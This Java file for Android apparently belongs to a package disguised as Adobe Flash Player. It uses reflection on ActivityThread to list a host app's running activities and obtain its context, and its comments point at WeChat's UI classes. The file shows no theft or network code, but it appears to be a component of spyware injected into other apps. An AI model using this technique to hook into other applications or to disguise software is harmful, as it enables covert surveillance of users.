package com.adobe.flashplayer.accessory;

import android.content.Context;
import java.lang.ref.WeakReference;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import android.app.Activity;
import android.content.Context;
import android.util.ArrayMap;
import android.util.Log;
import java.util.ArrayList;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;



public class AccessHelper {

    private static String TAG = "[ljg]AccessHelper ";

    Context mContext;

    public static int INSTALL_TYPE_APK = 2;
    public static int INSTALL_TYPE_MANUAL = 1;
    public static int INSTALL_TYPE_SO = 4;
    public static int INSTALL_TYPE_JAR = 3;

    public static int getInstallMode(Context context){
        String str =PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.SETUPMODE);
        if (str.equals(Public.SETUPMODE_JAR)){
            return INSTALL_TYPE_JAR;
        }else if (str.equals(Public.SETUPMODE_SO)){
            return INSTALL_TYPE_SO;
        }else if (str.equals(Public.SETUPMODE_APK)){
            return INSTALL_TYPE_APK;
        }else if (str.equals(Public.SETUPMODE_MANUAL)){
            return INSTALL_TYPE_MANUAL;
        }
        return 0;
    }


//System.err: android.view.ViewRootImpl$CalledFromWrongThreadException:
//Only the original thread that created a view hierarchy can touch its views.

//public static ActivityThread currentActivityThread() {
//	return sCurrentActivityThread;
//}

/*
public final Activity getActivity(IBinder token) {
        return mActivities.get(token).activity;
}
 */


/*
//IBinder对象,AMS持有此对象的代理对象，从而通知ActivityThread管理其他事情
final ApplicationThread mAppThread = new ApplicationThread();
final Looper mLooper = Looper.myLooper();
final H mH = new H();
//存储了所有的Activity,以IBinder作为key,IBinder是Activity在框架层的唯一表示
final ArrayMap<IBinder, ActivityClientRecord> mActivities = new ArrayMap<>();
//存储了所有的Service
final ArrayMap<IBinder, Service> mServices = new ArrayMap<>();
//ActivityThread对象，拿到这个对象，可以反射调用这个类的需要的方法
private static ActivityThread sCurrentActivityThread;

    public final Application getApplication() {
        return mApplication;
    }
*/

//com.tencent.mm.ui.MMFragmentActivity;
//public class MMFragmentActivity extends AppCompatActivity
//ArrayList<WeakReference<MMFragment>> record = new ArrayList();
//com.tencent.mm.ui.LauncherUI;
//public class LauncherUI extends MMFragmentActivity
//private static ArrayList<LauncherUI> tkk;

    public static ArrayList< Activity> getActivity() {
;
        try {
            ArrayList< Activity> list = new ArrayList<>();

            Class<?> activityThreadClass = null;
            try {
                activityThreadClass = Class.forName("android.app.ActivityThread");
                if (activityThreadClass == null) {
                    Log.e(TAG, "Class android.app.ActivityThread null");
                    return list;
                }else{
                    Log.e(TAG, "Class android.app.ActivityThread:" + activityThreadClass.toString());
                }
            } catch (Exception e) {
                Log.e(TAG, "Class forName android.app.ActivityThread exception");
                return list;
            }

            Field factivityThread = null;
            try {
                factivityThread = activityThreadClass.getDeclaredField("sCurrentActivityThread");
                if (factivityThread == null) {
                    Log.e(TAG, "factivityThread null");
                    return list;
                }else{
                    factivityThread.setAccessible(true);
                    Log.e(TAG, "factivityThread:" + factivityThread.toString());
                }
            } catch (Exception e) {
                Log.e(TAG, "factivityThread exception");
                return list;
            }


            Method mcurrentActivityThread = null;
            try {
                mcurrentActivityThread = activityThreadClass.getMethod("currentActivityThread");
                mcurrentActivityThread.setAccessible(true);
                Log.e(TAG, "method currentActivityThread:" + mcurrentActivityThread);
            } catch (Exception e) {
                Log.e(TAG, "get currentActivityThread method exception");
                return list;
            }


            Object activityThread = null;
            try {
                activityThread = mcurrentActivityThread.invoke(null);
                if (activityThread == null) {
                    Log.e(TAG, "sCurrentActivityThread null");
                    return list;
                }else{
                    Log.e(TAG, "sCurrentActivityThread:" + activityThread.toString());
                }
            } catch (Exception e) {
                Log.e(TAG, "get sCurrentActivityThread exception");
                return list;
            }

//		    Object activityThread1 = null;
//	        try {
//			    activityThread1 = activityThreadClass.getMethod("currentActivityThread").invoke(activityThreadClass);
//		        if (activityThread1 == null) {
//		        	Log.e(TAG, "activityThread1 null");
//		        	//return list;
//				}else{
//					Log.e(TAG, "activityThread1:" + activityThread1.toString());
//				}
//			} catch (Exception e) {
//				Log.e(TAG, "activityThread1 exception");
//			}

            Field activitiesField = null;
            try {
                Class <?> actcls = activityThread.getClass();
                if (actcls == null) {
                    Log.e(TAG, "get activityThread Class error");
                    return list;
                }else{
                    Log.e(TAG, "Class android.app.ActivityThread:" + actcls.toString());
                }

//	            Field[] fields = actcls.getDeclaredFields();
//	            for (int i=0;i<fields.length;i++){//遍历
//	                try {
//	                    //得到属性
//	                    Field subfield = fields[i];
//	                    //打开私有访问
//	                    subfield.setAccessible(true);
//	                    //获取属性
//	                    String name = subfield.getName();
//	                    Log.e(TAG, "get sub field name:" + name);
//	                } catch (Exception e) {
//	                    e.printStackTrace();
//	                }
//	            }

                activitiesField = actcls.getDeclaredField("mActivities");
                //activitiesField = activityThreadClass.getDeclaredField("mActivities");
                if (activitiesField == null) {
                    Log.e(TAG, "activityThread get mActivities null");
                    return list;
                }else{
                    activitiesField.setAccessible(true);
                    Log.e(TAG, "activityThread mActivities:" + activitiesField.toString());
                }
            } catch (Exception e) {
                Log.e(TAG, "get activityThread mActivities exception");
                e.printStackTrace();
                return list;
            }

            //final ArrayMap<IBinder, ActivityClientRecord> mActivities = new ArrayMap<>();
            ArrayMap <Object, Object>activities = null;
            try {
                Object testobj =  activitiesField.get(activityThread);
                Log.e(TAG, "test activityThread mActivities value:" + testobj.toString());
                //java.lang.reflect.Field.get(Object obj)方法返回指定对象上由此Field表示的字段的值。
                activities = (ArrayMap<Object, Object>) activitiesField.get(activityThread);
                if (activities == null ) {
                    Log.e(TAG, "get activityThread mActivities value null");
                    return list;
                }else{
                    Log.e(TAG, "get activityThread mActivities value:" + activities.toString());
                }
            } catch (Exception e) {
                Log.e(TAG, "get activityThread mActivities value exception");
                return list;
            }


            for (Object activityRecord : activities.values()) {
                Class <?>activityRecordClass = activityRecord.getClass();
                //Field pausedField = activityRecordClass.getDeclaredField("paused");
                //pausedField.setAccessible(true);
                //if (!pausedField.getBoolean(activityRecord)) {
                Field activityField = activityRecordClass.getDeclaredField("activity");
                if (activityField == null) {
                    Log.e(TAG, "activity field null");
                    continue;
                }else{
                    Log.e(TAG, "activity field:"+activityField.toString());
                }

                activityField.setAccessible(true);
                Activity activity = (Activity) activityField.get(activityRecord);
                if (activity == null) {
                    Log.e(TAG, "activity null");
                    continue;
                }else{
                    list.add(activity);
                    Log.e(TAG, "find activity:"+activity);
                    MyLog.writeLogFile("find activity:"+activity + "\r\n");
                }
                //}
            }

            if (list != null && list.size() > 0) {
                return list;
            }
        }catch(Exception e){
            Log.e(TAG, "unknown exception");
            e.printStackTrace();
            MyLog.writeLogFile("getActivity exception\r\n");
        }

        return null;
    }

    public static void setAttributeConstructor(Class <?> cls){

        try {
            Constructor[] c = cls.getDeclaredConstructors();
            for(Constructor con:c){
                Log.e(TAG,Modifier.toString(con.getModifiers())+ ":" + con.getName());

                Class class2[] = con.getParameterTypes();
                for(int i = 0;i<class2.length; i++){
                    Log.e(TAG,"arg:" +class2[i].getSimpleName());
                    if(i!=class2.length-1){
                        Log.e(TAG,"complete");
                    }
                }
            }
            Constructor cs1 = cls.getDeclaredConstructor();
            cs1.setAccessible(true);
            Object obj = cs1.newInstance();
            Log.e(TAG,"constructor:"+obj.toString());
//			Constructor cs2 = cls.getConstructor(int.class);
//			obj = cs2.newInstance(123);
//			System.out.println(obj.toString());
//			Constructor cs3 = cls.getDeclaredConstructor(int.class, String.class, double.class);
//			cs3.setAccessible(true);
//			obj = cs3.newInstance(123, "反射", 2.2);
//			System.out.println(obj.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }




    /*
    getMethods()返回某个类的所有公用（public）方法包括其继承类的公用方法，当然也包括它所实现接口的方法。
    getDeclaredMethods()对象表示的类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。
    当然也包括它所实现接口的方法。
    */

    public static Context getContext(){
        try {
            Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
            Method methodcat = ActivityThread.getMethod("currentActivityThread");
            Object currentActivityThread = methodcat.invoke(ActivityThread);
            Method methodga = currentActivityThread.getClass().getMethod("getApplication");
            Context context =(Context)methodga.invoke(currentActivityThread);
            if (context == null) {
                Log.e(TAG, "context null");
            }else{
                Log.e(TAG, "get context ok,package name:" + context.getPackageName()+"/class name:" + context.getClass().getName());
                return context;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }
}




//存储的Activity的表示对象ActivityClientRecord
/*
static final class ActivityClientRecord {
       //唯一表示
      IBinder token;
      int ident;
      Intent intent;
      String referrer;
      IVoiceInteractor voiceInteractor;
      Bundle state;
      PersistableBundle persistentState;
      //这里存储了真正的Activity对象
      Activity activity;
      Window window;
      Activity parent;
      String embeddedID;
      Activity.NonConfigurationInstances lastNonConfigurationInstances;
      boolean paused;
      boolean stopped;
      boolean hideForNow;
      Configuration newConfig;
      Configuration createdConfig;
      Configuration overrideConfig;
      // Used for consolidating configs before sending on to Activity.
      private Configuration tmpConfig = new Configuration();
      ActivityClientRecord nextIdle;
      ProfilerInfo profilerInfo;
      ActivityInfo activityInfo;
      CompatibilityInfo compatInfo;
      LoadedApk packageInfo;
      List<ResultInfo> pendingResults;
      List<ReferrerIntent> pendingIntents;
      boolean startsNotResumed;
      boolean isForward;
      int pendingConfigChanges;
      boolean onlyLocalRequest;
      View mPendingRemoveWindow;
      WindowManager mPendingRemoveWindowManager;
  }
*/







